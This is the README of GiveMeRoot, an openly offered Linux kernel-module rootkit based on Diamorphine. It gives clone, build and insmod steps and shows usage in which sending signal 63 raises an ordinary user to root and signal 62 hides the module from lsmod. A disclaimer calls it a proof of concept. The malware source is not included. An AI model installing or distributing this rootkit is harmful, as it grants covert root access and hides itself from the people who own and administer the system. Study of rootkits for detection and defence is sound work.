# GiveMeRoot
Simple LKM rootkit based on [Diamorphine](https://github.com/m0nad/Diamorphine).

# Environment tested
 - Debian 9
 - Kernel 4.9.0-8-amd64

# How it works
Basically the rootkit hooks the syscall kill, and whenever it receives a signal 63, the process is changed to run with root permissions.

# Install
```bash
root@lkm:~/# git clone https://github.com/mthbernardes/givemeroot.git
root@lkm:~/# cd givemeroot
root@lkm:~/givemeroot# make
make -C /lib/modules/4.9.0-8-amd64/build M=/root/givemeroot modules
make[1]: Entering directory '/usr/src/linux-headers-4.9.0-8-amd64'
  Building modules, stage 2.
  MODPOST 1 modules
make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-8-amd64'
root@lkm:~/givemeroot# insmod givemeroot.ko 
```

# Usage

## Grant root access
```bash
nuvm@lkm:~$ id
uid=1001(nuvm) gid=1001(nuvm) groups=1001(nuvm),100(users)
nuvm@lkm:~$ kill -63 0
nuvm@lkm:~$ id
uid=0(root) gid=0(root) groups=0(root),100(users),1001(nuvm)
```

## Hide/ Unhide module
```bash
nuvm@lkm:~$ lsmod | grep givemeroot
nuvm@lkm:~$ kill -62 0
nuvm@lkm:~$ lsmod | grep givemeroot
givemeroot             16384  0
nuvm@lkm:~$ kill -62 0
nuvm@lkm:~$ lsmod | grep givemeroot
```

# Disclaimer
Using this module might cause severe damage to your system, it was created as a proof of concept and should never be used on a production system!

By using this software the person in question agrees that they will use any of software in question in an ethical (non-malicious) way and agrees that the developer(s) are NOT held responsible for any damage caused by the use and or abuse of this software.

Misuse of any software from this website may result in criminal charges brought against the person in question depending on the country or state of residence which can result in probation, fines up or prison sentences up to 20 years in federal prison.
